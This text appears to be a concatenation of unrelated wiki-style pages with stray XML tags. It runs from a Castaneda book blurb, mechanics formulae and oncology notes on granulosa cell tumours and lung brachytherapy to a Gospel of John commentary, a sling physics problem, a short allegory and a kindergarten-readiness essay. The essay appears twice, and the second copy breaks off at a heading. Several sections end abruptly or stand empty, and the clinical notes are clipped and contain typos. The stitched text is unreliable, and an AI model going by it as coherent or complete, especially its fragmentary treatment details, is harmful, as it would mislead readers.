; ''The Art of Dreaming'' by Carlos Castaneda ISBN 006092554X : Like the skins of an onion, there are other worlds existing within our own and, through training and study, we can alter our consciousness and visit these amazing places. The greatest student of traveling through those spiritual universes is anthropologist Carlos Castaneda. Via the teachings of the great sorcerer don Juan, he has taken millions of readers on amazing journeys of the soul with such books as The Teachings of Don Juan, A Separate Reality, and Journey to Ixtlan. After six years of study and meditation, Carlos has now written what may be his most significant book of all, The Art of Dreaming - a book that fully explores how those on a spiritual quest can use &quot;the fourth gate&quot; of dreams as a two-way hatch to other worlds. With The Art of Dreaming, you will learn, as Carlos did, how finding the way to alternate realities through the consciousness of dreams is the essence of the great sorcerers; how ancient, remarkable, and sometimes dangerous beings now live among us; and how don Juan's training allows two or more people to dream and explore together. You will witness an adventure of the psyche unlike any other you've ever experienced, and you will participate fully in Castaneda's latest discoveries and explorations - discoveries and explorations that are as eye-opening and thrilling as anything he's ever written about before. Most of all, however, you will be utterly captivated by the story of this man's remarkable life and journeys of the soul; journeys that could only come from the teachings of don Juan, and the writings of Carlos Castaneda.

      <text xml:space="preserve">==Formulae==

By the end of this module you will be expected to have learnt the following formulae:

===Forces and Equilibrium===
* Weight &lt;math&gt;= mass \times g &lt;/math&gt;
* Limiting Friction: &lt;math&gt;F = \mu R \,&lt;/math&gt;
* &lt;math&gt; F = ma \,&lt;/math&gt;

===Kinematics===
* &lt;math&gt; v = u + at \,&lt;/math&gt;
* &lt;math&gt; s = ut + \frac {1}{2} at^2 &lt;/math&gt;
* &lt;math&gt; s = \frac {1}{2}(u+v)t &lt;/math&gt;
* &lt;math&gt; v^2 = u^2 + 2as \,&lt;/math&gt;
* &lt;math&gt; s = vt - \frac {1}{2} at^2 &lt;/math&gt;
* &lt;math&gt; v = \frac {ds}{dt}&lt;/math&gt; , &lt;math&gt; a = \frac {dv}{dt} &lt;/math&gt;

===Linear Momentum===
* Momentum of a Particle: &lt;math&gt;p = mv \,&lt;/math&gt;

Momentum is conserved. Therefore if there is a collision between 2 objects, the momentum before = momentum afterwards.

Impulse is the change in momentum.

'''Granulosa Cell Tumor of the Ovary'''


==Epidemiology==
*Uncommon, represents 2-5% of ovarian cancers
*Incidence 1/100,000
*Adult GCT
**95% of cases
**Median age at diagnosis: perimenopausal (50-54)
*Juvenile GCT
**5% of cases
**Usually seen in prepubertal girls and women &lt;30
**Present with isosexual precocious pseudopuberty, or abdominal/pelvic pain due to large mass
**Typically favorable prognosis
*No association with known mutations, including BRCA1/BRCA2
*Typically present with vaginal bleeding due to increased hormones

==Histology==
*Derived from the granulosa cell (estradiol production)
**Convert androstenedione produced in thecal cells to estradiol via aromatase
*Categorized as sex cord-stromal tumor
*Tumor markers
**Estradiol
***Even though granulosa cells produce estradiol, it's not a great marker
***No elevation in ~30% of patients with GCT
**Inhibin
***Useful marker of GCT in pre- and post-menopausal women
***Negative feedback stimulator of FSH
***Levels should be low in post-menopausal women
**Mullerian inhibitory substance (MIS)
***Produced by granulosa cells in developing follicles, and is thus cyclical
***Undecetable in post-menopausal women


==Risk Factors==
*Clinical factors
**Stage most important
*Path factors
**Large tumors (&gt;10-15 cm worse)
**Tumor rupture
**High mitotic index


==Survival==
*Staging uses FIGO System
**Majority present with Stage I disease (80-90%)

|}


==Treatment Overview==
*Surgery is main initial management
*Patients are typically in the same way as epithelial ovarian CA
**Stage IA: Can consider fertility preservation with unilateral SO and careful staging
**Otherwise: TAH/BSO (2-8% bilateral)
*Perform endometrial biospy to rule out concomitant uterine CA
*Adjuvant therapy
**Stage I (no RFs): none
**Stage I (high risk): 
***Chemotherapy (BEP, EP, CAP, or single agent platinum) or
***RT to whole pelvis or whole abdomen
**Stage II:
***Same as high risk Stage I: chemo or RT
**Stage III/IV:
***Platinum-based chemo
***Whole abdomen RT if optimally debulked Stage III
**Recurrent disease:
***Secondary surgical debulking if feasible
***Abdominal RT
***Platinum-based chemo
***Hormonal approaches (GNRH, tamoxifen, progestins) in selected patients



==Radiation==
*'''MD Anderson, 1999''' (1949-1988) PMID 10094877 -- &quot;Radiation treatment of advanced or recurrent granulosa cell tumor of the ovary.&quot; (Wolf JK, Gynecol Oncol. 1999 Apr;73(1):35-41.)
**Retrospective. 14 patients treated with RT for measurable residual or recurrent disease. Median F/U 13 years
**RT: 10/14 moving strip whole abdomen to 27-28 Gy, 4/10 pelvic RT to 45-61 Gy
**Response: 6/14 CR, but 3/6 failed 4-5 years later. 8/14 PD with median survival 12 months
**Conclusion: RT can induce response, with occasional long-term remission


==Review==

      <text xml:space="preserve">{{:Radiation Oncology/Lung/NSCLC:TOC}}


&lt;big&gt;'''Lung Brachytherapy'''&lt;/big&gt;


==Guidelines==
*'''American Brachytherapy Society; 2001''' PMID 11301833 -- &quot;Brachytherapy for carcinoma of the lung.&quot; (Nag S, Oncology (Williston Park). 2001 Mar;15(3):371-81.)


==Limited Resection with Intraoperative Brachytherapy==
*'''ACOSOG Z4032'''  
**Currently accruing; randomization of sublobar resection vs sublobar resection + brachytherapy
**Inclusion criteria: FEV1&lt;50% predicted, DLCO &lt;50% predicted or age &gt;75, exertional dyspnea, borderline PFTs
**'''2007''' PMID 17909906 -- &quot;Dosimetric evaluation of radiation exposure during I-125 vicryl mesh implants: implications for ACOSOG z4032.&quot; (Smith RP, Ann Surg Oncol. 2007 Dec;14(12):3610-3. Epub 2007 Oct 2.)
***Dosimetry. 22 patients. I-125 vicryl mesh implants, 40-60 seeds. Median activity 0.5 mCi per seed, median total activity 23 mCi
***Outcome: median dose to radiation oncologist 1 mrem, surgery 2 mrem, control diode on patient 5.4 mrerm/h
***Conclusion: Very little radiation exposure to physicians and staff during segmentectomy and I-125 vicryl mesh implantation    


*'''Multi-Institutional; 2005''' PMID 15678034 -- &quot;Lobar and sublobar resection with and without brachytherapy for small stage IA non-small cell lung cancer.&quot; (Fernando HC, J Thorac Cardiovasc Surg. 2005 Feb;129(2):261-7.)
**Retrospective. 4 institutions (Pittsburgh, UCLA, City of Hope, Allegheny General). 291 patients with T1N0. Sublobar resection (n=124) compared with lobar resection (n=167). Brachytherapy in 48% of sublobar operations. Sublobar patients older (SS), worse pulmonary function (SS). Mean F/U 2.9 years
**Outcome: Sublobar LR no brachy 17% vs. brachy 3%. No difference in OS in small tumors (&lt;2 cm). Significantly better OS in large tumors (2-3cm) lobar 5.8 years vs. sublobar 4 years (SS)
**Conclusion: Intraop brachy may reduce LR with small tumors

*'''Pittsburgh; 2003''' PMID 14605631 -- &quot;Comparison between sublobar resection and 125Iodine brachytherapy after sublobar resection in high-risk patients with Stage I non-small-cell lung cancer.&quot; (Santos R, Surgery. 2003 Oct;134(4):691-7; discussion 697.)
**Retrospective. 203 patients. 102 Stage IA treated 1989-1994 with surgery alone, 101 patients Stage IA-B treated 1997-2002 with surgery + intraoperative I-125 BT. BT mesh placed over staple line
**Recurrence: local - surgery alone 19% vs. surgery + BT 2% (SS), systemic 28% vs. 22% (NS)
**Toxicity: no difference in periop mortality or hospital stay
**Conclusion: Safe, should be considered in compromised patients

*'''Tufts; 2003''' PMID 12537222 -- &quot;Limited resection for non-small cell lung cancer: observed local control with implantation of I-125 brachytherapy seeds.&quot; (Lee W, Ann Thorac Surg. 2003 Jan;75(1):237-42; discussion 242-3.)
**Retrospective. 33 patients with 35 NSCLC, limited resection + brachytherapy I-125 seeds. Median F/U 4.2 years
**Outcome: 5-year OS 47%, T1N0 67%, T2N0 39%. Cancer-specific survival 77% and 53%
**Recurrence: overall 29%, local 6%, regional 17%
**Conclusion: Brachytherapy I-125 implantation gives low local recurrence, may prolong survival

**Treated patients with brachy alone from 1950's to 1980's who were unable to tolerate surgical resection.
**Median survival of 2.6 years
**53% local control


==Palliative Endobronchial Brachytherapy==
[[Image:NSCLC_EndobronchialRT_AP.JPG|thumb|right]]
[[Image:Radiation_Endobronchial2.jpg|thumb|right]]


'''''Systematic Review'''''
*'''Cochrane Review; 2008''' PMID 18425900 -- &quot;Palliative endobronchial brachytherapy for non-small cell lung cancer.&quot; (Cardona A, Cochrane Database Syst Rev. 2008 Apr 16;(2):CD004284.)
**13 randomized trials; meta-analysis not attempted due to heterogeneity of patients and treatments.
**Outcome: EBRT alone more effective for palliation than EBB alone. No conclusive evidence to recommend EBRT + EBB compared with EBRT alone. 

*'''Cancer Care Ontario; 2006''' PMID 16864071 -- &quot;The role of high-dose-rate brachytherapy in the palliation of symptoms in patients with non-small-cell lung cancer: a systematic review.&quot; (Ung YC, Brachytherapy. 2006 Jul-Sep;5(3):189-202.)
**29 trials
**Outcome: 
***Previously untreated patients: EBRT alone more effective than HDRBT. HDRBT with EBRT seems better symptoms relief than EBRT alone
***Previously treated patients: HDRBT recommended, provided it is technically feasible
**Toxicity: Fatal hemoptysis ranged from 7% to 22%


'''''Retrospective Evidence'''''
*'''Novi Sad, Serbia; 2010''' PMID 20439194 -- &quot;Clinical risk factors for early complications after high-dose-rate endobronchial brachytherapy in the palliative treatment of lung cancer.&quot; (Zaric B, Clin Lung Cancer. 2010 May;11(3):182-6.)
**Retrospective. 761 patients, advanced-stage lung cancer, HDRBT as part of multimodality therapy. 
**Outcome: Complication rate 5.4%. Predictors for complications: HTN, chronic cardiac arrhythmias, COPD, cardiomyopathy
**Conclusion: Closer monitoring of patients with identified risk factors is advisable

*'''Heidelberg; 2010''' (1987-2005) PMID 19836162 -- &quot;Treatment of recurrent bronchial carcinoma: the role of high-dose-rate endoluminal brachytherapy&quot; (Hauswald H, Int J Radiat Oncol Biol Phys. 2010 Jun 1;77(2):373-7. Epub 2009 Oct 14.)
**Retrospective. 41 patients, prior EBRT (median dose 56 Gy), retreatment with HDRBT for symptomatic recurrence. Median dose 15 Gy (5-29 Gy), median time-to-irradiation 9 months (2-54). Median F/U 7 months
**Outcome: Initial local control 73%; LC 6-months 38%, 1-year 17%. OS 6-months 58%, 1-year 18%. Median LC PFS 4 months 
**Toxicity: Fatal hemorrhage 15%; no Grade 3-4 toxicity in patients with locally controlled disease
**Conclusion: Palliative retreatment with HDRBT can be effective, causing only few complications

*'''Poznan, Poland; 2009''' PMID 19854525 -- &quot;HDR endobronchial brachytherapy (HDRBT) in the management of advanced lung cancer--comparison of two different dose schedules.&quot; (Skowronek J, Radiother Oncol. 2009 Dec;93(3):436-40. Epub 2009 Oct 23.)
**Retrospective. 648 patients, advanced lung cancer. Palliative HDRBT doses schedules 22.5/3 once/week (47%) or 10/1 (53%)
**Outcome: No difference in survival, similar efficacy in overcoming difficulties in breathing

      <text xml:space="preserve">'''John 12 Verses 1-11'''

Jesus, while preparing for the Passover, spends time in Bethany in the company of his disciples, Lazarus, and Lazarus' sisters Martha and Mary.  While enjoying dinner, Mary pours perfume on Jesus and washes his feet with her hair.  One will notice that this event takes place after John Chapter 11's description of Mary being &quot;...the same one who poured perfume on the Lord and wiped his feet with her hair&quot; (John 11:2).  Though this occurrence is seemingly out of place, the author might have done this for several reasons.  John may have attributed this event to Mary as an honor; acting somewhat as a title.  He may also have been describing (to those who were familiar with the oral telling of such a story) something that defined who Mary was (apart from all of the many Marys of the time); an act that typified her character.  In any case it showed her real love for Jesus in that she was willing to give everything she had to him, her only regret being that she could not give more.  It also showed here humility in that she anointed his feet rather than his head.  She never thought she was good enough to go so far as to anoint his head.  The letting loose of her hair also showed that she was very comfortable with Jesus.  Those who are really in love do not care what others think and live in a world of their own.  Her loose hair exemplified this.

Jesus' reply, 'Leave her alone; let her keep it for the day of my burial' in verse 7, suggests the outpouring of the ointment could be reserved as anticipation for Jesus' future burial.  Why would anyone object to using the ointment which would have been used to anoint his dead body when it can be poured over him while he is living? That way he can appreciate her action in love.  Mary's anointing Jesus is similar to other stories however this is a specifically distinctive event.  Other occurrences include an unnamed woman anointing Jesus' head also in Bethany (Matthew and Mark).  Likewise, an unnamed woman in Luke anoints Jesus' feet, presumably with ointment or perfume also before wiping the feet with her own hair.  &quot;In all three cases there is a protest at the expenditure of costly perfume which could have been sold, with the proceeds given to the poor&quot; (Smith 234).  In this chapter, it is &quot;unfaithful Judas&quot; who protests.  He says that the money from selling the perfume could be given to the poor, and used for a good cause, however we know from further verses he would really steal the money instead.  The poor are just an excuse.  It might be worth noting here also that this passage with Judas is not found in the other gospels, but rather we have in the other accounts all of the disciples together objecting to the woman's display.  The reason John changes up the account is not entirely clear but there are other examples in John's gospel of him pointing out Judas' betrayal.  It is possible that ideas about Judas as being a vessel of God's will were circulating and John was trying to squash them within his own community.  Whatever the case may be Jesus reprimands him and asks that he let Mary do this before his burial.  Judas will always have the poor, but not always Jesus lending to the thought that Jesus will not be around forever and his death is looming near.

The characters of Judas and Mary provide a literary element that is consistent with the style of John.  Judas and Mary are foils of each other.  Judas chooses an extreme of the path that John shows unbelievers and doubters taking.  In contrast, Mary resumes her role from earlier in the gospel as an example of total faith and devotion.  Their thoughts of the future were quite different, too.  The author of the Fourth Gospel depicts Mary as preparing a loved one for burial, while Judas only thinks of himself and of his monetary benefit.

In verse 8, Jesus states &quot;For you always have the poor with you, but you do not always have Me.&quot; (NAS) This verse has cross references from Hebrew Scriptures in Deuteronomy 15:11 and in the synoptic gospels in Matthew 26:11 and Mark 14:7. Although this is not the first time this short phrase has been brought up in the Bible, many questions or ideas about the character of God have arisen from it. For instance, the view of Gerard Sloyan in his book ''John'' believes that this &quot;became a watchword of callousness.&quot; Being a pretty bold statement he continues to explain by describing Jesus as &quot;favoring a good work done to him above the care of the poor- quite uncharacteristic of what we can deduce of the historical Jesus.&quot; James Burton Coffman disagrees. He believes that this was a &quot;profoundly proper evaluation of the true values inherent&quot; in the Bible. For instance if we look in 1 Kings 17:13 Ellijah asks the same thing of a woman. He states &quot;Do not fear; go, do as you have said, but make me a little bread cake from it first and bring it out to me, and afterward you may make one for yourself and for your son.&quot; (NAS) With that said, Jesus statement was not unlikely according to Coffman. John Gill's exposition was not based on whether the phrase was &quot;Jesus worthy&quot; rather he believes that the words were of simply prophecy that there will always be poor people to be taken care of and provided for but His &quot;his corporeal presence, which would be quickly withdrawn from them, would be no more an opportunity of showing him personal respect, in such a way.&quot; John simply believed that Jesus was trying to tell His disciples that these random acts of worship were not repeatable, but the poor will never cease. 

Verses 9-11 explain the Jews' plan to do away with Jesus. A large crowd of Jews--not the Jews in charge--went rushing to see Jesus and Lazarus as soon as they found out Jesus and Lazarus were there. At this point, the chief priests made plans to kill Lazarus. They realized that Jesus' ministry was gaining followers, and they wanted to not only do away with him, but also with traces of his works, including the once-dead Lazarus. According to the chief priests, Lazarus was a main reason that people were deserting the priests and putting their faith in Jesus. 

'''Verses 25-36'''
Again here we have Jesus making reference to eternal life.  His comments here mirror those of chapter 3 and chapter 11, once again emphasizing belief and life as a prominent theme in John.  In verse 27 you have Jesus foreshadowing the misgivings he will show later in the garden before his death when he says, &quot;Should I say, 'Father, save me from this hour'?&quot;  Then there is a rather strange happening in verse 28 when God actually speaks saying, &quot;I have glorified it, and I will glorify it again.&quot;  The crowd standing around are split about what has just happened, some contend that it is just thunder, while others say it is an angel.  Jesus essentially tells them that the voice is trying to warn them of their impending doom.  He also makes reference to being &quot;lifted up&quot; to foreshadow his means of execution.  

'''Fear, Conformity, and Vanity in John Chapter 12'''  With many profound Christological miracles already documented in the Gospel of John, one might reason that the peoples of the area would have come to embrace Christ and His message.  The fact that they do not speaks to the powers of vanity and fear (see verses 42 and 43).  The Jews wanted to reap the benefits of societal inclusion more than eternal life.  But before we condemn their decision as foolish and unrealistic, I would ask that we consider an example much more recent in  history: the Holocaust.  What could possibly enslave so many people to do the bidding of so few?  After the war, psychological experiments (e.g. the Milgram experiment) were conducted to see how people reacted to authority figures pressuring them to do various tasks that had the potential to cause great harm to others.    Many of the people went through with the experiments simply because they were told to.  Fear and the pressure to conform were their primary motivations, and we can only imagine what the situation must have been for the Jews at the time of Christ, whose lives were able to be influenced very significantly by those in power.

== John 12 Verses 12-19 ==

The Johannine account of Jesus' return to Jerusalem one very noticeable difference from the Synoptic gospels.  There are actually two crowds that greet Jesus.  The two crowds are named as pilgrims coming to observe Passover and those who were present for the miracle Jesus performed for Lazarus.  The first group came because of what they heard, the second because of what they saw.

John 12:12-19 once again shows that the disciples did not understand Jesus or his mission until after the resurrection.  Verse 16 shows this to the reader.  The disciples did not understand that Jesus' entry into Jersualem was a fulfillment of prophecy.  It is surprising that the men who were with Jesus the most would not understand the man's mission more than they did.

'''John 12:46-48''' illustrates themes that have been common in Jesus' teachings.  In verse 46 the theme of Jesus being the light of the world is repeated.  Jesus is the light and believers will not remain in the darkness.  In addition, Jesus' goal is salvation not judgment.  The climax of Jesus' teachings comes in verses 49 and 50, which is eternal life.  Eternal life begins the instant one believes in Christ and can be a blessing throughout life and for eternity.  Those believers who are saved will live forever in the presence of God. This teaching is possibly directed to those who believe in Jesus but are too afraid to admit to it.

      <text xml:space="preserve">===The Magnificent Sling===
====Part 1. (Medium)====
Many kinematic problems seem to be relatively simple once one knows the basic equations of motion.  And conservation of energy is simple when all the equations are in place as well.  The question is then on problems which deal with both.  Take a simple sling, which is rotated in an axis perpendicular to that of gravity.  This sling is then released, and the payload travels a distance R before landing where it is supposed to go.

For a simple sling, this is a purely kinematic problem.  Gravity pulls down on the payload as it travels as follows:

&lt;math&gt;y''(t) = -g&lt;/math&gt;
&lt;math&gt;x''(t) = 0&lt;/math&gt;

Hence the equation for motion of each of the axis is at:

&lt;math&gt;y(t) = -gt^2/2 + V_\mathrm{y_0}t + y_0&lt;/math&gt;
&lt;math&gt;x(t) = V_\mathrm{x_0}t + x_0&lt;/math&gt;

And from there, one can calculate the range given:

*&lt;math&gt;g&lt;/math&gt;, The gravitational constant, i.e. 9.81 m/s²
*&lt;math&gt;x_0&lt;/math&gt;, The position of the object in the x-cordinate at time t=0
*&lt;math&gt;x_0&lt;/math&gt;, The position of the object in the y-cordinate at time t=0
*&lt;math&gt;V_\mathrm{x_0}&lt;/math&gt;, The velocity of the object in the x-cordinate at time t=0
*&lt;math&gt;V_\mathrm{y_0}&lt;/math&gt;, The velocity of the object in the y-cordinate at time t=0.

Hence, with this set of equations, anyone can calculate the range.  Simply solve for t in the x equation, plug this value of t in the y equation.  This method will work if you've got a flat surface with a function y=0, or some other function y=f(x), which is why I prefer it.  Simply find the intersection of the two functions (the ground function, and the new one you created) to solve for x when the functions collide.  Use this to solve for y.  If the problem asks for it, use the value found for x and use it to solve for t.

So, imagine you have a ball on a string of length r, which is always traveling at a tangential velocity V.  Find the range of this ball using pure kinematics, as a function of the angle released.  Find the maximum range of the ball.

*a.) Is it better to swing underhand or overhand?
*b.) What angle gives the most range?
*c.) What angle would make it so the ball passed right through the center of the sling circle?

====Part 2. (Hard)====

Turn the sling into a catapult.  What's the release angle on this to make for optimum range?  Note that the velocity with respect to angle is no longer constant.  It will increase linearly with height above the ground, much like the descending weight's velocity will increase as it gets closer to the ground.

*a.) What is the range of the catapult?
*b.) What's the max range?

====Part 3. (Very Hard)====

Now let's beef up the scale.  Back to the sling.  Now the radius of the circle is so large that the potential energy difference between the bottom of the circle and the top of the circle is not negligible.  Assuming this is the only change:

*a.) What is the range of the sling, as a function of release angle?
*b.) What angle gives the max range?
*c.) Is it still better to swing underhand or overhand?
*d.) What angle would make it pass through the center of the circle?

(If you get a quartic equation in cos²(θ) like I did, just post that equation.)

&lt;small&gt;(short story to be used to give examples in the essays and so avoid claims of soapbox action),

Consensus (the end of the trial execution of the sentence),

&lt;/small&gt;

There were two men, Tim and Tom, they were building a house, but Tim decided to break the building regulations and skip requesting permissions for the work from the City Council and to that Tom started to raise objections and pose problems, so next day, Tim called his uncle, who by chance was a judge.

A few days later, with fanfare, Tom was accused of various crimes, the judge, after some time of assuring that all knew the accusations, got a willing group, some already had problems with Tom or were close friend of the judge and others were just eager to do the work, with their support and as the trial reached its climax and the facts would have to be addressed it was dismissed and Tom punished.

A few months after, the town was fed up of having to deal with Tom, he wouldn't shut up about what had been done to him, but most didn't care, it was not their problem, and the few that had shown concert were told to be quiet or there would be something for them to, but since Tom wouldn't stop or go away, the situation could only get worse, Tim's uncle hearing of this approached Tom and said &quot;Well, Tom you know, I'm very concerned about your situation, this can't continue, this is a disgrace, you are making life to difficult to the town. I probably shouldn't have just executed the sentence but you were so inflexible and Tim truly needed that new house and you know pretty well that loitering on city grounds is a great offense, so, to see if we solve this situation your created, what could I do to get you over it ?&quot;

&quot;Well&quot;, said Tom, &quot;the problem is that my family has deserted me, my friend and people in town will not talk to me as they think I'm a real criminal and all this noise I have been doing, it didn't help the situation needer, could you do something about those accusations or provide a fair trail, I will even confess to loitering on city grounds.&quot;.

&quot;You know&quot;, said Tim's uncle, &quot;that won't do, the past is the past, we shouldn't concern ourselves with what was done and we should look ahead to what we can do, besides it would make me and my friends look bad, I could even lose my job and my nephew would go to jail and in future problems wouldn't be resolved in so comfortable way, since you will not conform to the situation, what would you like to change about your present situation ?&quot;

&quot;I don't know&quot;, said Tom, &quot;what I would like is justice, but without addressing the past I genuinely don't know what would resolve this, but what I really miss most and would like to have back is my hands.&quot;

'''Introduction'''

Most parents worry a great deal about their children, as they approach every age and developmental stage from teething to potty training.  But the one thing that parents obsess mostly about is deciding whether or not their children are really ready for kindergarten.  Some school districts depend on age as the influential factor, some teachers believe that one of the most important features to determine if a child is ready for kindergarten is how much previous understanding he or she has acquired in a school setting.  Some of the frequent questions that parents ask are:  Is my child ready for kindergarten?  Should I send my child with a late summer or fall birthday to kindergarten, or should I wait another year?  Will my child fit in with the rest of the children?  Will my child get along with the teacher?  Will my child be taught everything he or she needs to know?  These are some of the questions puzzling parents as they look ahead to elementary school.   Some of the answers to these questions can be answered by investigating the kindergarten your child will attend.  The parents should find out how many children are in the class, what is the age range in the class, how much support is available to the teacher, such as aides and volunteers, how and when are they trained, how does the teacher guarantee children learn at their own pace, and what techniques are engaged in teaching the children who assimilate concepts faster or slower than the average?  Parents should call the school and make an appointment to visit and observe the kindergarten class.  Teachers should suggest parents to share their values and goals so that teachers can give the child the best assistance possible. 


'''Kindergarten Readiness: Age or Skills''' 

Moreover, schools seem to expect the children entering kindergarten to know a lot more information than when we were in school.  But what if the child does not know their colors or can not tell the letter &quot;A&quot; from &quot;Z&quot;?  It does not necessarily mean that the child is not ready for kindergarten; some children are just late bloomers.  That is precisely why I don't agree with the assumption of birth date solely deciding if a child is ready or not.  As a matter of fact, age is one of the indicators that schools look at.  Educators need to tell parents that they are their children's first and most important teacher.  Parents should not be afraid to do what's best for their children.  They know what is best for their children.  “But most early childhood educators agree that a child's brain development is the most important gauge of readiness for kindergarten. In other words, your child may be small for his age, and lagging behind other kids socially and physically, but if his language, thinking, and perceptual skills are in place, then he'll probably do well in kindergarten.”  (ParentCenter editorial staff, 1997-2007)


'''What tests are being used?'''

Furthermore, a lot of elementary schools are now testing kindergarten at the beginning of the school year.  The tests are used to see how much a child knows and how much assistance a child needs.  Portsmouth districts test children before or shortly after the school year has started.  In Portsmouth all kindergartners are assessed by the teacher which uses the Phonological Awareness and Literacy Screening (PALS).  If the child has a low PALS score, they will receive assistance from the reading specialist.  “PALS-K is a measure of children’s knowledge of several important literacy fundamentals: phonological awareness, alphabet recognition, concept of word, knowledge of letter sounds and spelling.   PALS-K provides a direct means of matching literacy instruction to specific literacy needs and provides a means of identifying those children who are relatively behind in their acquisition of these fundamental”. (The Rector and the Board of Visitors of the University of Virginia, 2007)


'''Student Checklists'''

Although there is no perfect test for parents to check to see if their child is ready for kindergarten, there are many internet articles that have checklists on them, which can assist parents with their child’s development.  In one article, “Kindergarten Readiness Checklist”, it suggests a checklist that helps parents to see how well their child is doing in obtaining skills that are found in most kindergarten classes.  The article also states that parents should recheck the same skills every month to see how their child is progressing.   Some of the checklist suggestions are:

•  Listen to stories without interrupting 

•  Recognize rhyming sounds

•  Understand actions have both causes and effects

•  Show understanding of general times of day 

•  Cut with scissors 				

•  Trace basic shapes 

•  Begin to share with others			

•  Start to follow rules 

•  Be able to recognize authority		

•  Manage bathroom needs

•  Begin to control oneself 			

•  Button shirts, pants, coats, and zip up zippers

•  Separate from parents without being upset 	

•  Speak understandably 

•  Identify rhyming words 			

•  Talk in complete sentences of five to six words 

•  Look at pictures and then tell stories 	

•  Identify the beginning sound of some words

•  Identify some alphabet letters		

•  Count to ten 

•  Recognize some common sight words like &quot;stop&quot; 

•  Bounce a ball 

•  Pay attention for short periods of time to adult-directed tasks 

•  Sort similar objects by color, size, and shape 

•  Recognize groups of one, two, three, four, and five objects 

(Kindergarten Readiness Checklist, 2000-2007)


'''Preparing Parents'''

	On the other hand, schools can identify other fundamental skills that the children need, which can help parents prepare their children for kindergarten.  In the journal article, “Readiness for Kindergarten: What Schools Can Do”,  it claims: “developing a community-wide understanding of skills and knowledge important to children as they enter kindergarten, and providing information and education to other childcare providers- including families and private pre kindergartens- so that they are better able to help children develop these skills and knowledge”.  (Protheroe, 34)


	In additionally, schools can help parents understand kindergarten readiness by scheduling meetings that focus on it.  By understanding kindergarten readiness teachers and parents can increase the proper activities for the children.  “Through the meetings, administrators and teachers can provide the school district’s educational philosophy, learning models, curriculum structure, and detailed screening process for kindergarten admission”.  (Choi, Kim, Murdock 14)


'''Teachers and Administrator'''

The school administrators and teachers expect children to develop certain physical skills before they enter kindergarten.  Children are expected to have succeeded in many skills such as walking, running, and climbing, and fine motor skills requiring eye-hand coordination.  For example, some of the eye-hand coordination skills are just the use of a pencil, crayons, or scissors.  Fine motor skills are utilized when the child begins to write their name.  It is understood that children have obtained both visual and auditory discrimination of objects and sounds.  Some of these skills are used to learn the names and sounds of letter and the names and quantities of numerals.  Children are expected to have developed the idea of same and different, so that they can sort objects into groups whose members are alike in some way.  Most kindergarten teacher expected their children to recognize and name colors, shapes, sizes, and their own names. Many school systems and states have risen the entrance age for kindergarten in hopes that the older age of the class will increase the likelihood of the children's success.


'''Conclusion'''

In short, kindergarten readiness depends on a child's development of social motor skills and language skills.  A good way for parents to help their children is by reading books everyday.  Reading will not only increase their vocabulary, their personal growth, but also develop their brain.  As a parent I firmly believe that reading will assist children in their daily growth to becoming intelligent students.  



'''SIDEBAR''' 

Kindergarten is an important step on the course of education.  A little kindness and preparation from parents and teachers can make this step an enjoyable and flourishing time for your child.

'''Essay Question'''

'''Please describe in your own words what you think parents should do to help their children get ready for kindergarten.  Give me a personal story about your kindergarten class.'''


Parents need to read books everyday to their children.  I believe that reading will increase the growth of knowledge and reading will also help develop the brain.  Reading will also increase a child’s vocabulary.  As a parent I firmly believe that reading will assist children in their growth to becoming intelligent students.  

Kindergarten was not the best time of my life.  I had a kindergarten teacher that did not have any patience with children.  I believe she should have been a general in the Army.  My mother use to put my hair in pony tails everyday in kindergarten.  I remember one day, my teacher was yelling at another student and got very upset at this student.  Instead of taking it out on him, she took her anger out on me.  I only came up to her to ask to go to the bathroom.  She grabbed my hair and pulled me around the room.  I of course cried and was very upset.  I went home to my mother and she came up there and expressed her feelings.  The teacher apologizes to my mother, but her position in the school was terminated.  I hope my child will never have to deal with that kind of teacher.

{{Reading level|Intermediate}}
The '''scientific method''' is the process by which new scientific knowledge is gained and verified. The study of this method, and of its long history, is essentially a study of science itself. Many criticisms of science, scientists, or scientific knowledge stem from a misunderstanding, or ignorance of this method. It is the purpose of this book to expose both the history of the method, along with its modern use, its strengths, and its weaknesses.

      <text xml:space="preserve">Hi! 

At the moment, I'm here primarily for the [[Cookbook]]. Having a nice interest in cooking, I thought I'd go about and do some work on the Cookbook.

For those who'd like to know, I'm also the [[w:User:Digiku|Digiku]] at the [[w:Main_Page|English Wikipedia]]. You may go there for more detailed information about me.

      <text xml:space="preserve">== Motivation ==
One of the nice things about using the switch statement is that you can quickly display HTML that has absolute positioning over the current form.  This is done by adding some div elements that reference a style sheet.  Although this example is for a delete confirmation, it can be use in any place you need to have a model dialog with messages and a cancel button.

== Discussion ==
This example appears to show a new window on top of the existing form.  This is called a modal window because you can not make any further changes to the form without a confirmation or cancel action.

== Acknowledgment ==
This example program was contributed by a CSS guru who wishes to remain anonymous till he has more time to make the example better.

      <text xml:space="preserve">'''Kindergarten Already!!''' 
'''Where did the time GO??'''


By: Gelsomina Wellman







=='''Introduction'''==

Most parents worry a great deal about their children, as they approach every age and developmental stage from teething to potty training. But the one thing that parents obsess mostly about is deciding whether or not their children are really ready for kindergarten. Some school districts depend on age as the influential factor, some teachers believe that one of the most important features to determine if a child is ready for kindergarten is how much previous understanding he or she has acquired in a school setting. Some of the frequent questions that parents ask are: Is my child ready for kindergarten? Should I send my child with a late summer or fall birthday to kindergarten, or should I wait another year? Will my child fit in with the rest of the children? Will my child get along with the teacher? Will my child be taught everything he or she needs to know? These are some of the questions puzzling parents as they look ahead to elementary school. Some of the answers to these questions can be answered by investigating the kindergarten your child will attend. The parents should find out how many children are in the class, what is the age range in the class, how much support is available to the teacher, such as aides and volunteers, how and when are they trained, how does the teacher guarantee children learn at their own pace, and what techniques are engaged in teaching the children who assimilate concepts faster or slower than the average? Parents should call the school and make an appointment to visit and observe the kindergarten class. Teachers should suggest parents to share their values and goals so that teachers can give the child the best assistance possible.



=='''Kindergarten Readiness: Age or Skills'''==

Moreover, schools seem to expect the children entering kindergarten to know a lot more information than when we were in school. But what if the child does not know their colors or can not tell the letter &quot;A&quot; from &quot;Z&quot;? It does not necessarily mean that the child is not ready for kindergarten; some children are just late bloomers. That is precisely why I don't agree with the assumption of birth date solely deciding if a child is ready or not. As a matter of fact, age is one of the indicators that schools look at. Educators need to tell parents that they are their children's first and most important teacher. Parents should not be afraid to do what's best for their children. They know what is best for their children. “But most early childhood educators agree that a child's brain development is the most important gauge of readiness for kindergarten. In other words, your child may be small for his age, and lagging behind other kids socially and physically, but if his language, thinking, and perceptual skills are in place, then he'll probably do well in kindergarten.” (ParentCenter editorial staff, 1997-2007)



=='''What tests are being used?'''==

